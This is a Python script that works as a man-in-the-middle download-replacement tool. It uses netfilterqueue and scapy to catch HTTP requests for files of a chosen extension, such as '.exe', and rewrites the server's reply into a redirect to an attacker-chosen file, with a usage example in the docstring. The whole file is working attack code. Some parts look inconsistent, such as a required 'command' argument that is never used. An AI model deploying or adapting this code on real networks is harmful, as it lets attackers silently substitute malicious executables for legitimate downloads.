#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import argparse

'''
        To run the script, follow the steps below:
        
        python script.py -c command -p 8080 -f '.exe' -i '192.168.100.210' \
            -r 'HTTP/1.1 301 Moved Permanently\nLocation: https://the.earth.li/~sgtatham/putty/0.63/x86/psftp.exe\n\n'
'''

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet, select_port, file_ext, ip_address, redirect_url):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            if scapy_packet[scapy.TCP].dport == select_port:
                print('[+] packet destination found : ' + str(select_port))
                if file_ext in str(scapy_packet[scapy.Raw].load) and ip_address not in str(scapy_packet[scapy.Raw].load):
                    print(f'[+] {file_ext} Request.')
                    ack_list.append(scapy_packet[scapy.TCP].ack)
                    print(scapy_packet.show())

            elif scapy_packet[scapy.TCP].sport == select_port:
                print('[+] packet source found : ' + str(select_port))
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print('[+] Replacing file')
                    modified_packet = set_load(scapy_packet, redirect_url)
                    packet.set_payload(bytes(modified_packet))
        except IndexError:
            print("[+] Layer [TCP] not found!\n", end='')

    packet.accept()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Redirect downloads to another file")
    parser.add_argument("-c", "--command", dest="command",
                        help="Command to execute", required=True)
    parser.add_argument("-p", "--select-port", dest="select_port",
                        help="Select port", type=int, required=True)
    parser.add_argument("-f", "--file-ext", dest="file_ext",
                        help="File extension", required=True)
    parser.add_argument("-i", "--ip-address", dest="ip_address",
                        help="IP Address", required=True)
    parser.add_argument("-r", "--redirect-url", dest="redirect_url",
                        help="Redirect URL", required=True)

    args = parser.parse_args()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, lambda packet: process_packet(
        packet, args.select_port, args.file_ext, args.ip_address, args.redirect_url))
    queue.run()
